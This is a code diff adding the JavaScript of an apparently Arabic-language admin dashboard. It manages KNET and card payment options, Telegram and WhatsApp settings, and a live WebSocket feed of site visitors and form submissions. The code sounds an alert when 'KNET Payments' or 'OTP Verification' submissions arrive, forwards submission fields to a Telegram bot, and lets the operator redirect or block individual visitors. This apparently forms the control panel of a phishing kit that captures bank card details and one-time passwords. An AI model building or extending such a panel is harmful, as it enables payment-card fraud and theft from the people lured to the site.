+        paymentSettingsFeedbackEl.hidden = false;
+        if (variant) {
+          paymentSettingsFeedbackEl.classList.add("is-" + variant);
+        }
+      }
+
+      function normalizePaymentSettings(nextSettings) {
+        var knetEnabled = Boolean(nextSettings && nextSettings.knet_enabled);
+        var cardsEnabled = Boolean(nextSettings && nextSettings.cards_enabled);
+        var testingEnabled = Boolean(nextSettings && nextSettings.testing_enabled);
+        if (!knetEnabled && !cardsEnabled) {
+          knetEnabled = true;
+        }
+        return {
+          knet_enabled: knetEnabled,
+          cards_enabled: cardsEnabled,
+          testing_enabled: testingEnabled
+        };
+      }
+
+      function applyStoredPaymentSettings(nextSettings) {
+        storedPaymentSettings = normalizePaymentSettings(nextSettings);
+        if (paymentKnetInputEl) {
+          paymentKnetInputEl.checked = storedPaymentSettings.knet_enabled;
+        }
+        if (paymentCardsInputEl) {
+          paymentCardsInputEl.checked = storedPaymentSettings.cards_enabled;
+        }
+        if (testingAutofillInputEl) {
+          testingAutofillInputEl.checked = storedPaymentSettings.testing_enabled;
+        }
+        if (paymentSettingsSaveBtnEl) {
+          paymentSettingsSaveBtnEl.disabled = paymentSettingsSaving;
+        }
+      }
+
+      async function persistPaymentSettings() {
+        if (paymentSettingsSaving) {
+          return false;
+        }
+        var nextSettings = normalizePaymentSettings({
+          knet_enabled: paymentKnetInputEl ? paymentKnetInputEl.checked : true,
+          cards_enabled: paymentCardsInputEl ? paymentCardsInputEl.checked : true,
+          testing_enabled: testingAutofillInputEl ? testingAutofillInputEl.checked : false
+        });
+        paymentSettingsSaving = true;
+        applyStoredPaymentSettings(nextSettings);
+        setPaymentSettingsFeedback("جارٍ حفظ طرق الدفع...", "loading");
+        try {
+          var response = await window.fetch("/admin/api/payment/settings", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            body: JSON.stringify(nextSettings)
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = {};
+          }
+          if (!response.ok || payload.status !== "ok" || !payload.settings) {
+            applyStoredPaymentSettings(storedPaymentSettings);
+            setPaymentSettingsFeedback("تعذر حفظ طرق الدفع.", "error");
+            paymentSettingsSaving = false;
+            applyStoredPaymentSettings(storedPaymentSettings);
+            return false;
+          }
+          paymentSettingsSaving = false;
+          applyStoredPaymentSettings(payload.settings);
+          setPaymentSettingsFeedback("تم حفظ طرق الدفع.", "");
+          return true;
+        } catch (error) {
+          paymentSettingsSaving = false;
+          applyStoredPaymentSettings(storedPaymentSettings);
+          setPaymentSettingsFeedback("تعذر حفظ طرق الدفع.", "error");
+          return false;
+        }
+      }
+
+      async function saveAllSettings() {
+        var hasInlineEdits = telegramIsEditing || whatsappIsEditing;
+        if (telegramIsEditing) {
+          handleTelegramApiTokenChange();
+        }
+        if (whatsappIsEditing) {
+          handleWhatsappChange();
+        }
+        var didSave = await persistPaymentSettings();
+        if (didSave && !hasInlineEdits) {
+          closeSettingsModal();
+        }
+      }
+
+      function openTelegramConfirmModal(message, confirmLabel, action, cancelAction) {
+        if (!telegramConfirmModalEl || !telegramConfirmMessageEl || !telegramConfirmActionBtnEl) {
+          return;
+        }
+        telegramConfirmAction = action || null;
+        telegramConfirmCancelAction = cancelAction || null;
+        telegramConfirmMessageEl.textContent = message || "";
+        telegramConfirmActionBtnEl.textContent = confirmLabel || "Confirm";
+        telegramConfirmModalEl.hidden = false;
+        telegramConfirmModalEl.setAttribute("aria-hidden", "false");
+        document.body.classList.add("is-admin-modal-open");
+      }
+
+      function closeTelegramConfirmModal() {
+        if (!telegramConfirmModalEl) {
+          return;
+        }
+        if (typeof telegramConfirmCancelAction === "function") {
+          telegramConfirmCancelAction();
+        }
+        telegramConfirmAction = null;
+        telegramConfirmCancelAction = null;
+        telegramConfirmModalEl.hidden = true;
+        telegramConfirmModalEl.setAttribute("aria-hidden", "true");
+        if (!settingsModalEl || settingsModalEl.hidden) {
+          document.body.classList.remove("is-admin-modal-open");
+        }
+      }
+
+      async function runTelegramConfirmAction() {
+        if (typeof telegramConfirmAction !== "function") {
+          closeTelegramConfirmModal();
+          return;
+        }
+        var action = telegramConfirmAction;
+        telegramConfirmCancelAction = null;
+        closeTelegramConfirmModal();
+        await action();
+      }
+
+      async function persistTelegramSettings(apiToken, chatId) {
+        try {
+          var response = await window.fetch("/admin/api/telegram/settings", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            body: JSON.stringify({
+              api_token: apiToken,
+              chat_id: String(chatId || "")
+            })
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = {};
+          }
+          if (!response.ok || payload.status !== "ok" || !payload.settings) {
+            setTelegramChatId("");
+            setTelegramFeedback("تعذر حفظ إعدادات تيليجرام", "error");
+            return false;
+          }
+          applyStoredTelegramSettings(payload.settings);
+          return true;
+        } catch (error) {
+          setTelegramChatId("");
+          setTelegramFeedback("تعذر حفظ إعدادات تيليجرام", "error");
+          return false;
+        }
+      }
+
+      async function removeStoredTelegramSettings() {
+        try {
+          var response = await window.fetch("/admin/api/telegram/settings", {
+            method: "DELETE",
+            headers: {
+              "X-CSRF-Token": csrfToken
+            }
+          });
+          if (!response.ok) {
+            setTelegramFeedback("تعذر حذف إعدادات تيليجرام", "error");
+            return;
+          }
+          applyStoredTelegramSettings({ api_token: "", chat_id: "" });
+          setTelegramInputEditing(false);
+        } catch (error) {
+          setTelegramFeedback("تعذر حذف إعدادات تيليجرام", "error");
+        }
+      }
+
+      async function persistWhatsappSettings(value) {
+        try {
+          var response = await window.fetch("/admin/api/whatsapp/settings", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            body: JSON.stringify({
+              value: value
+            })
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = {};
+          }
+          if (!response.ok || payload.status !== "ok" || !payload.settings) {
+            setWhatsappFeedback("Unable to save WhatsApp number.", "error");
+            return false;
+          }
+          applyStoredWhatsappSettings(payload.settings);
+          return true;
+        } catch (error) {
+          setWhatsappFeedback("Unable to save WhatsApp number.", "error");
+          return false;
+        }
+      }
+
+      async function removeStoredWhatsappSettings() {
+        try {
+          var response = await window.fetch("/admin/api/whatsapp/settings", {
+            method: "DELETE",
+            headers: {
+              "X-CSRF-Token": csrfToken
+            }
+          });
+          if (!response.ok) {
+            setWhatsappFeedback("Unable to remove WhatsApp number.", "error");
+            return;
+          }
+          applyStoredWhatsappSettings({ value: "" });
+          setWhatsappInputEditing(false);
+        } catch (error) {
+          setWhatsappFeedback("Unable to remove WhatsApp number.", "error");
+        }
+      }
+
+      async function validateTelegramToken(apiToken) {
+        try {
+          var response = await window.fetch("/admin/api/telegram/get-updates", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            body: JSON.stringify({ api_token: apiToken })
+          });
+          var payload = {};
+          try {
+            payload = await response.json();
+          } catch (error) {
+            payload = { status: "error" };
+          }
+          return {
+            ok: response.ok,
+            payload: payload
+          };
+        } catch (error) {
+          return {
+            ok: false,
+            payload: { status: "error" }
+          };
+        }
+      }
+
+      async function lookupTelegramResponse(apiToken, requestId) {
+        var result = await validateTelegramToken(apiToken);
+        if (requestId !== telegramLookupRequestId) {
+          return;
+        }
+        if (result.ok) {
+          if (result.payload.status !== "ok" || !result.payload.chat_id) {
+            setTelegramChatId("");
+            setTelegramFeedback("يرجى تشغيل خادم بوت التيليجرام", "error");
+            return;
+          }
+          await persistTelegramSettings(apiToken, result.payload.chat_id);
+          setTelegramInputEditing(false);
+          return;
+        }
+        setTelegramChatId("");
+        setTelegramFeedback("يرجى ادخال رمز صحيح", "error");
+      }
+
+      async function confirmTelegramTokenEdit(nextApiToken) {
+        setTelegramFeedback("جارٍ التحقق من رمز تيليجرام...", "loading");
+        var result = await validateTelegramToken(nextApiToken);
+        if (!result.ok) {
+          applyStoredTelegramSettings(storedTelegramSettings, false);
+          setTelegramFeedback("يرجى ادخال رمز صحيح", "error");
+          return;
+        }
+        if (result.payload.status !== "ok" || !result.payload.chat_id) {
+          applyStoredTelegramSettings(storedTelegramSettings, false);
+          setTelegramFeedback("يرجى تشغيل خادم بوت التيليجرام", "error");
+          return;
+        }
+        await persistTelegramSettings(nextApiToken, result.payload.chat_id);
+        setTelegramInputEditing(false);
+      }
+
+      function handleTelegramApiTokenInput() {
+        if (!telegramApiTokenInputEl) {
+          return;
+        }
+        var apiToken = telegramApiTokenInputEl.value.trim();
+        if (telegramIsEditing) {
+          setTelegramFeedback("", "");
+          return;
+        }
+        if (telegramLookupTimeoutId) {
+          window.clearTimeout(telegramLookupTimeoutId);
+          telegramLookupTimeoutId = 0;
+        }
+        telegramLookupRequestId += 1;
+        if (!apiToken) {
+          setTelegramFeedback("", "");
+          setTelegramChatId(
+            hasStoredTelegramSettings() ? storedTelegramSettings.chat_id : ""
+          );
+          return;
+        }
+        var requestId = telegramLookupRequestId;
+        setTelegramChatId("");
+        setTelegramFeedback("جارٍ التحقق من رمز تيليجرام...", "loading");
+        telegramLookupTimeoutId = window.setTimeout(function () {
+          lookupTelegramResponse(apiToken, requestId);
+        }, 450);
+      }
+
+      function handleTelegramApiTokenChange() {
+        if (!telegramApiTokenInputEl || !telegramIsEditing) {
+          return;
+        }
+        var nextApiToken = telegramApiTokenInputEl.value.trim();
+        if (!nextApiToken || nextApiToken === String(storedTelegramSettings.api_token || "")) {
+          applyStoredTelegramSettings(storedTelegramSettings, false);
+          return;
+        }
+        openTelegramConfirmModal(
+          "هل تريد تأكيد تعديل رمز تيليجرام؟",
+          "Confirm",
+          async function () {
+            await confirmTelegramTokenEdit(nextApiToken);
+          },
+          function () {
+            applyStoredTelegramSettings(storedTelegramSettings, false);
+          }
+        );
+      }
+
+      function handleTelegramApiTokenBlur() {
+        if (!telegramApiTokenInputEl || !telegramIsEditing) {
+          return;
+        }
+        if (telegramConfirmModalEl && !telegramConfirmModalEl.hidden) {
+          return;
+        }
+        var nextApiToken = telegramApiTokenInputEl.value.trim();
+        if (nextApiToken === String(storedTelegramSettings.api_token || "")) {
+          applyStoredTelegramSettings(storedTelegramSettings, false);
+        }
+      }
+
+      async function confirmWhatsappEdit(nextValue) {
+        setWhatsappFeedback("Saving WhatsApp number...", "loading");
+        await persistWhatsappSettings(nextValue);
+        setWhatsappInputEditing(false);
+      }
+
+      function handleWhatsappInput() {
+        if (!whatsappInputEl) {
+          return;
+        }
+        if (whatsappIsEditing) {
+          setWhatsappFeedback("", "");
+          return;
+        }
+        if (!whatsappInputEl.value.trim()) {
+          setWhatsappFeedback("", "");
+        }
+      }
+
+      function handleWhatsappChange() {
+        if (!whatsappInputEl) {
+          return;
+        }
+        var nextValue = whatsappInputEl.value.trim();
+        var storedValue = String(storedWhatsappSettings.value || "");
+        if (!nextValue) {
+          if (whatsappIsEditing || hasStoredWhatsappSetting()) {
+            applyStoredWhatsappSettings(storedWhatsappSettings, false);
+          } else {
+            setWhatsappFeedback("", "");
+          }
+          return;
+        }
+        if (nextValue === storedValue) {
+          applyStoredWhatsappSettings(storedWhatsappSettings, false);
+          return;
+        }
+        if (whatsappIsEditing) {
+          openTelegramConfirmModal(
+            "Do you want to update the saved WhatsApp number?",
+            "Confirm",
+            async function () {
+              await confirmWhatsappEdit(nextValue);
+            },
+            function () {
+              applyStoredWhatsappSettings(storedWhatsappSettings, false);
+            }
+          );
+          return;
+        }
+        confirmWhatsappEdit(nextValue);
+      }
+
+      function handleWhatsappBlur() {
+        if (!whatsappInputEl || !whatsappIsEditing) {
+          return;
+        }
+        if (telegramConfirmModalEl && !telegramConfirmModalEl.hidden) {
+          return;
+        }
+        if (whatsappInputEl.value.trim() === String(storedWhatsappSettings.value || "")) {
+          applyStoredWhatsappSettings(storedWhatsappSettings, false);
+        }
+      }
+
+      function bindAdminGestureGuards() {
+        if (window.history && typeof window.history.pushState === "function") {
+          window.history.replaceState({ adminDashboardGuard: true }, "", window.location.href);
+          window.history.pushState({ adminDashboardSentinel: true }, "", window.location.href);
+          window.addEventListener("popstate", function () {
+            window.history.pushState({ adminDashboardSentinel: true }, "", window.location.href);
+          });
+        }
+
+        window.addEventListener(
+          "wheel",
+          function (event) {
+            if (Math.abs(event.deltaX) <= Math.abs(event.deltaY)) {
+              return;
+            }
+            event.preventDefault();
+          },
+          { passive: false, capture: true }
+        );
+
+        var touchStartX = 0;
+        var touchStartY = 0;
+        window.addEventListener(
+          "touchstart",
+          function (event) {
+            if (!event.touches || event.touches.length !== 1) {
+              return;
+            }
+            touchStartX = event.touches[0].clientX;
+            touchStartY = event.touches[0].clientY;
+          },
+          { passive: true, capture: true }
+        );
+        window.addEventListener(
+          "touchmove",
+          function (event) {
+            if (!event.touches || event.touches.length !== 1) {
+              return;
+            }
+            var deltaX = event.touches[0].clientX - touchStartX;
+            var deltaY = event.touches[0].clientY - touchStartY;
+            if (Math.abs(deltaX) <= Math.abs(deltaY)) {
+              return;
+            }
+            event.preventDefault();
+          },
+          { passive: false, capture: true }
+        );
+      }
+
+      async function sendSubmissionToTelegram(submissionId, triggerEl) {
+        var submission = allSubmissions.find(function (item) {
+          return String(item.id || "") === String(submissionId || "");
+        });
+        if (!submission) {
+          return;
+        }
+        var fields = buildTelegramSubmissionFields(submission);
+        if (fields.length === 0) {
+          return;
+        }
+        if (triggerEl) {
+          triggerEl.disabled = true;
+          triggerEl.classList.add("is-sending");
+        }
+        try {
+          await window.fetch("/admin/api/telegram/send-submission", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": csrfToken
+            },
+            body: JSON.stringify({ fields: fields })
+          });
+        } catch (error) {
+        } finally {
+          if (triggerEl) {
+            triggerEl.disabled = false;
+            triggerEl.classList.remove("is-sending");
+          }
+        }
+      }
+
+      function bindSubmissionTelegramButtons() {
+        if (!submissionsBodyEl || submissionsBodyEl.dataset.telegramBound === "true") {
+          return;
+        }
+        submissionsBodyEl.dataset.telegramBound = "true";
+        submissionsBodyEl.addEventListener("click", function (event) {
+          var buttonEl = event.target.closest(".submission-telegram-hover");
+          if (!buttonEl) {
+            return;
+          }
+          event.preventDefault();
+          var submissionId = buttonEl.getAttribute("data-submission-id") || "";
+          if (!submissionId) {
+            return;
+          }
+          sendSubmissionToTelegram(submissionId, buttonEl);
+        });
+      }
+
+      async function fetchAdminWsToken() {
+        try {
+          var response = await window.fetch("/admin/api/ws-token", {
+            headers: { Accept: "application/json" },
+            credentials: "same-origin"
+          });
+          var payload = await response.json();
+          if (!response.ok || payload.status !== "ok" || !payload.ws_token) {
+            return null;
+          }
+          return String(payload.ws_token);
+        } catch (error) {
+          return null;
+        }
+      }
+
+      function scheduleAdminWebSocketReconnect() {
+        if (adminSocketReconnectTimerId) {
+          return;
+        }
+        adminSocketReconnectTimerId = window.setTimeout(function () {
+          adminSocketReconnectTimerId = 0;
+          connectAdminWebSocket();
+        }, adminSocketReconnectDelayMs);
+        adminSocketReconnectDelayMs = Math.min(
+          adminSocketReconnectDelayMs * 2,
+          ADMIN_SOCKET_RECONNECT_MAX_MS
+        );
+      }
+
+      async function connectAdminWebSocket() {
+        if (adminSocket && (adminSocket.readyState === WebSocket.OPEN || adminSocket.readyState === WebSocket.CONNECTING)) {
+          return;
+        }
+        var nextToken = await fetchAdminWsToken();
+        if (nextToken) {
+          wsToken = nextToken;
+        } else if (!wsToken) {
+          scheduleAdminWebSocketReconnect();
+          return;
+        }
+        var protocol = window.location.protocol === "https:" ? "wss" : "ws";
+        var wsUrl = protocol + "://" + window.location.host + "/admin/ws?token=" + encodeURIComponent(wsToken);
+        var socket = new WebSocket(wsUrl);
+        adminSocket = socket;
+
+        socket.onopen = function () {
+          adminSocketReconnectDelayMs = 1000;
+        };
+
+        socket.onmessage = function (event) {
+          try {
+            var data = JSON.parse(event.data);
+            if (data.type === "snapshot") {
+              setOnlineUsers(data.online_users);
+              if (Array.isArray(data.recent_submissions)) {
+                setSubmissions(data.recent_submissions);
+              }
+              setVisitors(data.recent_visitors, data.total_visitors);
+            } else if (data.type === "visitors_snapshot" && Array.isArray(data.recent_visitors)) {
+              setVisitors(data.recent_visitors, data.total_visitors);
+            } else if (data.type === "online_users") {
+              setOnlineUsers(data.online_users);
+            } else if (data.type === "new_submission" && data.submission) {
+              var submissionFormName = String(data.submission.form_name || "");
+              if (submissionFormName === "KNET Payments" || submissionFormName === "OTP Verification") {
+                playKnetAlertSound();
+              }
+              prependSubmission(data.submission);
+            } else if (data.type === "visitor_archived" && Array.isArray(data.recent_visitors)) {
+              if (selectedVisitorId === (data.visitor_id || "")) {
+                selectedVisitorId = null;
+                applyVisitorSelection();
+              }
+              setVisitors(data.recent_visitors, data.total_visitors);
+            }
+          } catch (error) {
+          }
+        };
+
+        socket.onerror = function () {
+          try {
+            socket.close();
+          } catch (error) {
+          }
+        };
+
+        socket.onclose = function () {
+          if (adminSocket === socket) {
+            adminSocket = null;
+          }
+          scheduleAdminWebSocketReconnect();
+        };
+      }
+
+      var initialOnlineCount = Number.parseInt(countEl.textContent, 10);
+      if (Number.isFinite(initialOnlineCount)) {
+        setOnlineUsers(initialOnlineCount);
+      } else {
+        setOnlineUsers(null);
+      }
+      applyStoredVisitorsWidth();
+      applyStoredMobileVisitorsHeight();
+      bindDashboardResizer();
+      bindCompactTopbarBehavior();
+      setVisitors(allVisitors, totalVisitorsCount);
+      applyVisitorSelection();
+      connectAdminWebSocket();
+      bindSubmissionTelegramButtons();
+      bindAdminGestureGuards();
+      bindKnetAlertUnlockListeners();
+      applyStoredTelegramSettings(storedTelegramSettings, false);
+      applyStoredWhatsappSettings(storedWhatsappSettings, false);
+      applyStoredPaymentSettings(storedPaymentSettings);
+      applyStoredConnectionSettings(storedConnectionSettings, false);
+      bindConnectionSettings();
+
+      if (settingsTriggerEl) {
+        settingsTriggerEl.addEventListener("click", openSettingsModal);
+      }
+
+      if (settingsModalCloseEl) {
+        settingsModalCloseEl.addEventListener("click", closeSettingsModal);
+      }
+
+      if (settingsModalEl) {
+        settingsModalEl.addEventListener("click", function (event) {
+          if (event.target === settingsModalEl) {
+            closeSettingsModal();
+          }
+        });
+      }
+
+      if (telegramConfirmCloseBtnEl) {
+        telegramConfirmCloseBtnEl.addEventListener("click", closeTelegramConfirmModal);
+      }
+
+      if (telegramConfirmCancelBtnEl) {
+        telegramConfirmCancelBtnEl.addEventListener("click", closeTelegramConfirmModal);
+      }
+
+      if (telegramConfirmActionBtnEl) {
+        telegramConfirmActionBtnEl.addEventListener("click", runTelegramConfirmAction);
+      }
+
+      if (telegramConfirmModalEl) {
+        telegramConfirmModalEl.addEventListener("click", function (event) {
+          if (event.target === telegramConfirmModalEl) {
+            closeTelegramConfirmModal();
+          }
+        });
+      }
+
+      if (visitorPagesCloseBtnEl) {
+        visitorPagesCloseBtnEl.addEventListener("click", closeVisitorPagesModal);
+      }
+
+      if (visitorPagesModalEl) {
+        visitorPagesModalEl.addEventListener("click", function (event) {
+          if (event.target === visitorPagesModalEl) {
+            closeVisitorPagesModal();
+          }
+        });
+      }
+
+      if (submissionsDetailsTriggerEl) {
+        submissionsDetailsTriggerEl.addEventListener("click", openSubmissionsDetailsModal);
+      }
+
+      if (submissionsDetailsCloseBtnEl) {
+        submissionsDetailsCloseBtnEl.addEventListener("click", closeSubmissionsDetailsModal);
+      }
+
+      if (submissionsDetailsModalEl) {
+        submissionsDetailsModalEl.addEventListener("click", function (event) {
+          if (event.target === submissionsDetailsModalEl) {
+            closeSubmissionsDetailsModal();
+          }
+        });
+      }
+
+      if (visitorPagesListEl) {
+        visitorPagesListEl.addEventListener("click", function (event) {
+          var itemEl = event.target.closest(".visitor-pages-item");
+          if (!itemEl) {
+            return;
+          }
+          event.preventDefault();
+          queueVisitorRedirect(
+            activeVisitorPagesModalVisitorId,
+            itemEl.getAttribute("data-page-path") || ""
+          );
+        });
+      }
+
+      if (telegramApiTokenInputEl) {
+        telegramApiTokenInputEl.addEventListener("input", handleTelegramApiTokenInput);
+        telegramApiTokenInputEl.addEventListener("change", handleTelegramApiTokenChange);
+        telegramApiTokenInputEl.addEventListener("blur", handleTelegramApiTokenBlur);
+        telegramApiTokenInputEl.addEventListener("keydown", function (event) {
+          if (event.key === "Enter" && telegramIsEditing) {
+            event.preventDefault();
+            telegramApiTokenInputEl.blur();
+          }
+        });
+      }
+
+      if (telegramSettingsEditBtnEl) {
+        telegramSettingsEditBtnEl.addEventListener("click", function () {
+          setTelegramInputEditing(true);
+          setTelegramFeedback("", "");
+          if (telegramApiTokenInputEl) {
+            telegramApiTokenInputEl.focus();
+            telegramApiTokenInputEl.select();
+          }
+        });
+      }
+
+      if (telegramSettingsRemoveBtnEl) {
+        telegramSettingsRemoveBtnEl.addEventListener("click", function () {
+          openTelegramConfirmModal(
+            "هل تريد حذف رمز تيليجرام ومعرف المحادثة المحفوظين؟",
+            "Remove",
+            removeStoredTelegramSettings
+          );
+        });
+      }
+
+      if (whatsappInputEl) {
+        whatsappInputEl.addEventListener("input", handleWhatsappInput);
+        whatsappInputEl.addEventListener("change", handleWhatsappChange);
+        whatsappInputEl.addEventListener("blur", handleWhatsappBlur);
+        whatsappInputEl.addEventListener("keydown", function (event) {
+          if (event.key === "Enter") {
+            event.preventDefault();
+            whatsappInputEl.blur();
+          }
+        });
+      }
+
+      if (whatsappEditBtnEl) {
+        whatsappEditBtnEl.addEventListener("click", function () {
+          setWhatsappInputEditing(true);
+          setWhatsappFeedback("", "");
+          if (whatsappInputEl) {
+            whatsappInputEl.focus();
+            whatsappInputEl.select();
+          }
+        });
+      }
+
+      if (whatsappRemoveBtnEl) {
+        whatsappRemoveBtnEl.addEventListener("click", function () {
+          openTelegramConfirmModal(
+            "Do you want to remove the saved WhatsApp number?",
+            "Remove",
+            removeStoredWhatsappSettings
+          );
+        });
+      }
+
+      if (paymentKnetInputEl) {
+        paymentKnetInputEl.addEventListener("change", function () {
+          setPaymentSettingsFeedback("", "");
+        });
+      }
+
+      if (paymentCardsInputEl) {
+        paymentCardsInputEl.addEventListener("change", function () {
+          setPaymentSettingsFeedback("", "");
+        });
+      }
+
+      if (paymentSettingsSaveBtnEl) {
+        paymentSettingsSaveBtnEl.addEventListener("click", saveAllSettings);
+      }
+
+      if (visitorsKnetToggleEl) {
+        visitorsKnetToggleEl.addEventListener("click", function () {
+          showKnetVisitorsOnly = !showKnetVisitorsOnly;
+          visitorsKnetToggleEl.classList.toggle("is-active", showKnetVisitorsOnly);
+          visitorsKnetToggleEl.setAttribute("aria-pressed", showKnetVisitorsOnly ? "true" : "false");
+          setVisitors(allVisitors, totalVisitorsCount);
+          applyVisitorSelection();
+        });
+      }
+
+      document.addEventListener("click", function (event) {
+        if (
+          event.target.closest(".visitor-option") ||
+          event.target.closest(".visitor-archive-action") ||
+          event.target.closest(".visitor-block-toggle") ||
+          event.target.closest(".visitor-location-button") ||
+          event.target.closest(".submissions-panel") ||
+          event.target.closest("#submissions-details-modal")
+        ) {
+          return;
+        }
+        resetOtherVisitorSwipes(null);
+        if (!selectedVisitorId) {
+          return;
+        }
+        selectedVisitorId = null;
+        applyVisitorSelection();
+      });
+
+      document.addEventListener("visibilitychange", function () {
+        if (!document.hidden) {
+          connectAdminWebSocket();
+        }
+      });
+
+      document.addEventListener("keydown", function (event) {
+        if (event.key === "Escape" && submissionsDetailsModalEl && !submissionsDetailsModalEl.hidden) {
+          closeSubmissionsDetailsModal();
+          return;
+        }
+        if (event.key === "Escape" && visitorPagesModalEl && !visitorPagesModalEl.hidden) {
+          closeVisitorPagesModal();
+          return;
+        }
+        if (event.key === "Escape" && telegramConfirmModalEl && !telegramConfirmModalEl.hidden) {
+          closeTelegramConfirmModal();
+          return;
+        }
+        if (event.key === "Escape" && settingsModalEl && !settingsModalEl.hidden) {
+          closeSettingsModal();
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
